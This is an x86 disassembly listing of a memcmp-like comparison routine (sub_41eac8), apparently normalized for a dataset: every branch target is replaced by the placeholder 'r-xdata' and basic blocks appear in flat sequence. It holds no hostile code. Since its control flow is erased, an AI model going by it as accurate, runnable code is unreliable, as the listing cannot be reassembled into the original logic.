jne r-xdata
movzx esi [ ecx - 0xe ]
movzx eax [ edx - 0xe ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xa ]
movzx eax [ edx - 0xa ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x6 ]
movzx eax [ edx - 0x6 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x2 ]
movzx eax [ edx - 0x2 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x1b ]
movzx eax [ edx - 0x1b ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x17 ]
movzx eax [ edx - 0x17 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x13 ]
movzx eax [ edx - 0x13 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xf ]
movzx eax [ edx - 0xf ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xb ]
movzx eax [ edx - 0xb ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x7 ]
movzx eax [ edx - 0x7 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x3 ]
movzx eax [ edx - 0x3 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x1c ]
movzx eax [ edx - 0x1c ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x18 ]
movzx eax [ edx - 0x18 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x14 ]
movzx eax [ edx - 0x14 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x10 ]
movzx eax [ edx - 0x10 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0xc ]
movzx eax [ edx - 0xc ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x8 ]
movzx eax [ edx - 0x8 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx - 0x4 ]
movzx eax [ edx - 0x4 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
xor eax eax
movzx esi al
movzx eax [ edx + 0xc ]
sub esi eax
je r-xdata
movzx esi [ ecx + 0xa ]
movzx eax [ edx + 0xa ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
test eax eax
jne r-xdata
xor ecx ecx
test eax eax
setg cl
lea ecx [ ecx + ecx - 0x1 ]
mov eax ecx
jmp r-xdata
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax [ ecx + 0x10 ]
cmp eax [ edx + 0x10 ]
je r-xdata
movzx esi [ ecx + 0xd ]
movzx eax [ edx + 0xd ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx + 0xb ]
movzx eax [ edx + 0xb ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
xor eax eax
movzx esi al
movzx eax [ edx + 0x10 ]
sub esi eax
je r-xdata
movzx esi [ ecx + 0xe ]
movzx eax [ edx + 0xe ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax [ ecx + 0x14 ]
cmp eax [ edx + 0x14 ]
je r-xdata
movzx esi [ ecx + 0x11 ]
movzx eax [ edx + 0x11 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx + 0xf ]
movzx eax [ edx + 0xf ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
xor eax eax
movzx esi al
movzx eax [ edx + 0x14 ]
sub esi eax
je r-xdata
movzx esi [ ecx + 0x12 ]
movzx eax [ edx + 0x12 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax [ ecx + 0x18 ]
cmp eax [ edx + 0x18 ]
je r-xdata
movzx esi [ ecx + 0x15 ]
movzx eax [ edx + 0x15 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx + 0x13 ]
movzx eax [ edx + 0x13 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
xor eax eax
movzx esi al
movzx eax [ edx + 0x18 ]
sub esi eax
je r-xdata
movzx esi [ ecx + 0x16 ]
movzx eax [ edx + 0x16 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
mov eax [ ecx + 0x1c ]
cmp eax [ edx + 0x1c ]
je r-xdata
movzx esi [ ecx + 0x19 ]
movzx eax [ edx + 0x19 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx + 0x17 ]
movzx eax [ edx + 0x17 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
xor eax eax
movzx esi al
movzx eax [ edx + 0x1c ]
sub esi eax
je r-xdata
movzx esi [ ecx + 0x1a ]
movzx eax [ edx + 0x1a ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
add ecx 0x20
add edx 0x20
sub edi 0x20
movzx esi [ ecx + 0x1d ]
movzx eax [ edx + 0x1d ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx + 0x1b ]
movzx eax [ edx + 0x1b ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
movzx esi [ ecx + 0x1e ]
movzx eax [ edx + 0x1e ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
movzx esi [ ecx + 0x1f ]
movzx eax [ edx + 0x1f ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
test eax eax
jne r-xdata
test eax eax
jne r-xdata
mov eax esi
jmp r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax + eax - 0x1 ]
mov esi eax
test eax eax
jne r-xdata
sub_41eac8
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
mov eax edi
sub eax 0x0
je r-xdata
xor eax eax
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
movzx eax [ eax ]
movzx ecx [ ecx ]
jmp r-xdata
dec eax
je r-xdata
sub eax ecx
je r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
dec eax
je r-xdata
pop edi
pop esi
pop ebp
retn
xor ecx ecx
test eax eax
setg cl
lea ecx [ ecx + ecx - 0x1 ]
mov eax ecx
jmp r-xdata
movzx eax [ ecx + 0x1 ]
movzx ecx [ esi + 0x1 ]
jmp r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
dec eax
je r-xdata
movzx eax [ ecx + 0x1 ]
movzx edx [ esi + 0x1 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push ebx
push 0x20
pop edx
jmp r-xdata
movzx eax [ ecx + 0x2 ]
movzx ecx [ esi + 0x2 ]
jmp r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
movzx eax [ ecx + 0x1 ]
movzx edx [ esi + 0x1 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
cmp edi edx
jae r-xdata
movzx eax [ ecx + 0x2 ]
movzx edx [ esi + 0x2 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
mov esi [ eax ]
cmp esi [ ecx ]
je r-xdata
add eax edi
add ecx edi
cmp edi 0x1f
ja r-xdata
movzx eax [ ecx + 0x3 ]
movzx ecx [ esi + 0x3 ]
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
xor esi esi
movzx esi [ eax ]
movzx ebx [ ecx ]
sub esi ebx
je r-xdata
xor eax eax
jmp [ edi * 4 + jump_table_4200c8 ]
mov eax esi
jmp r-xdata
mov esi [ eax + 0x4 ]
cmp esi [ ecx + 0x4 ]
je r-xdata
movzx esi [ eax + 0x1 ]
movzx ebx [ ecx + 0x1 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
mov edx [ eax - 0x1c ]
cmp edx [ ecx - 0x1c ]
je r-xdata
mov edx [ eax - 0x18 ]
cmp edx [ ecx - 0x18 ]
je r-xdata
mov edx [ eax - 0x14 ]
cmp edx [ ecx - 0x14 ]
je r-xdata
mov edx [ eax - 0x10 ]
cmp edx [ ecx - 0x10 ]
je r-xdata
mov edx [ eax - 0xc ]
cmp edx [ ecx - 0xc ]
je r-xdata
mov edx [ eax - 0x8 ]
cmp edx [ ecx - 0x8 ]
je r-xdata
mov edx [ eax - 0x4 ]
cmp edx [ ecx - 0x4 ]
je r-xdata
mov edx [ eax - 0x1d ]
cmp edx [ ecx - 0x1d ]
je r-xdata
mov edx [ eax - 0x19 ]
cmp edx [ ecx - 0x19 ]
je r-xdata
mov edx [ eax - 0x15 ]
cmp edx [ ecx - 0x15 ]
je r-xdata
mov edx [ eax - 0x11 ]
cmp edx [ ecx - 0x11 ]
je r-xdata
mov edx [ eax - 0xd ]
cmp edx [ ecx - 0xd ]
je r-xdata
mov edx [ eax - 0x9 ]
cmp edx [ ecx - 0x9 ]
je r-xdata
mov edx [ eax - 0x5 ]
cmp edx [ ecx - 0x5 ]
je r-xdata
movzx ecx [ ecx - 0x1 ]
movzx eax [ eax - 0x1 ]
sub eax ecx
je r-xdata
mov edx [ eax - 0x1e ]
cmp edx [ ecx - 0x1e ]
je r-xdata
mov edx [ eax - 0x1a ]
cmp edx [ ecx - 0x1a ]
je r-xdata
mov edx [ eax - 0x16 ]
cmp edx [ ecx - 0x16 ]
je r-xdata
mov edx [ eax - 0x12 ]
cmp edx [ ecx - 0x12 ]
je r-xdata
mov edx [ eax - 0xe ]
cmp edx [ ecx - 0xe ]
je r-xdata
mov edx [ eax - 0xa ]
cmp edx [ ecx - 0xa ]
je r-xdata
mov edx [ eax - 0x6 ]
cmp edx [ ecx - 0x6 ]
je r-xdata
mov dx [ eax - 0x2 ]
cmp dx [ ecx - 0x2 ]
je r-xdata
mov edx [ eax - 0x1f ]
cmp edx [ ecx - 0x1f ]
je r-xdata
mov edx [ eax - 0x1b ]
cmp edx [ ecx - 0x1b ]
je r-xdata
mov edx [ eax - 0x17 ]
cmp edx [ ecx - 0x17 ]
je r-xdata
mov edx [ eax - 0x13 ]
cmp edx [ ecx - 0x13 ]
je r-xdata
mov edx [ eax - 0xf ]
cmp edx [ ecx - 0xf ]
je r-xdata
mov edx [ eax - 0xb ]
cmp edx [ ecx - 0xb ]
je r-xdata
mov edx [ eax - 0x7 ]
cmp edx [ ecx - 0x7 ]
je r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
pop ebx
jmp r-xdata
xor esi esi
movzx esi [ eax + 0x4 ]
movzx ebx [ ecx + 0x4 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x2 ]
movzx ebx [ ecx + 0x2 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xc ]
movzx esi [ eax - 0xc ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor eax eax
movzx esi dl
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0x9 ]
movzx esi [ eax - 0x9 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor ecx ecx
test eax eax
setg cl
lea ecx [ ecx + ecx - 0x1 ]
mov eax ecx
jmp r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1e ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xa ]
movzx esi [ eax - 0xa ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
movzx edx [ ecx - 0x2 ]
movzx esi [ eax - 0x2 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0x1f ]
movzx esi [ eax - 0x1f ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xf ]
movzx esi [ eax - 0xf ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
je r-xdata
mov esi [ eax + 0x8 ]
cmp esi [ ecx + 0x8 ]
je r-xdata
movzx esi [ eax + 0x5 ]
movzx ebx [ ecx + 0x5 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x3 ]
movzx ebx [ ecx + 0x3 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x7 ]
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x8 ]
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1d ]
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx edx [ ecx - 0x9 ]
movzx esi [ eax - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
movzx esi [ eax - 0x1e ]
movzx edx [ ecx - 0x1e ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
mov eax edx
jmp r-xdata
xor esi esi
movzx esi [ eax + 0x8 ]
movzx ebx [ ecx + 0x8 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x6 ]
movzx ebx [ ecx + 0x6 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
